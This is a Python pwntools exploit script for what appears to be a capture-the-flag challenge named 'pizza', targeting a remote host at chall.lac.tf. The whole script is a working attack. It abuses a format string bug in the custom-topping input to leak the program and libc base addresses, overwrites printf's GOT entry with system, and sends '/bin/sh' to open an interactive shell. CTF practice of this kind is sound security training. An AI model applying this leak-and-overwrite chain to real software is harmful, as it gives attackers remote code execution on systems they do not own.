#!/usr/bin/env python3

from pwn import *

exe = ELF("./pizza")
libc = ELF("./libc6_2.36-9+deb12u4_amd64.so")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.lac.tf", 31134)

    return r


def leak_prog_base_addr():
    r.sendlineafter(b"> ", b"12")
    r.sendlineafter(b"Enter custom topping: ", b"%49$lx")
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", b"2")

    exe.address = int(r.recvlines(2)[-1], 16) - exe.symbols["main"]
    log.info(f"Program base address: 0x{exe.address:x}")


def leak_libc_addr():
    fmt_string = b"%09$s---%10$s---%11$s---" + p64(exe.got.printf) + p64(exe.got.puts) + p64(exe.got.setbuf)

    r.sendlineafter(b"> ", b"12")
    r.sendlineafter(b"Enter custom topping: ", fmt_string)
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", b"2")

    # Previously used to find the correct LIBC, now we just need one address
    funcs = r.recvlines(2)[-1].split(b"---")[:3]    
    funcs = [int.from_bytes(f, byteorder = 'little') for f in funcs]

    libc.address = funcs[0] - libc.symbols["printf"]
    log.info(f"LIBC base address: 0x{libc.address:x}")


def spawn_shell():
    payload = fmtstr_payload(6, {exe.got["printf"]: libc.symbols["system"]}, write_size = "short")

    r.sendlineafter(b"> ", b"12")
    r.sendlineafter(b"Enter custom topping: ", payload)
    r.sendlineafter(b"> ", b"/bin/sh")
    r.sendlineafter(b"> ", b"exit")

    r.interactive("$ ")


def main():
    r = conn()

    leak_prog_base_addr()
    r.sendlineafter(b"Order another pizza? (y/n): ", b"y")
    leak_libc_addr()
    r.sendlineafter(b"Order another pizza? (y/n): ", b"y")
    spawn_shell()


if __name__ == "__main__":
    main()
